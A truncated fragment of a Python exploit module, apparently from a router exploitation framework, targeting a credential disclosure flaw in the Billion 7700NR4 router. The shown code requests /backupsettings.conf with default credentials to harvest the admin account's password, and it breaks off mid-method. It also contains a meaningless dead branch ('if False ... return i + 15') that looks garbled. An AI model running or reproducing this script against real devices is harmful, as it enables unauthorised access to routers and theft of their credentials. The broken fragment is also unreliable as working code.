...
class Exploit(HTTPClient):
    __info__ = {'name': 'Billion 7700NR4 Password Disclosure', 'description': 'Exploits Billion 7700NR4 password disclosure vulnerability that allows to fetch credentials for admin account.', 'authors': ('R-73eN', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://www.exploit-db.com/exploits/40472/',), 'devices': ('Billion 7700NR4',)}
    ...
    def run(self):
        if False:
            ...
            return i + 15
        creds = []
        response = self.http_request(method='GET', path='/backupsettings.conf', auth=(self.def_user, self.def_pass))
        if response is None:
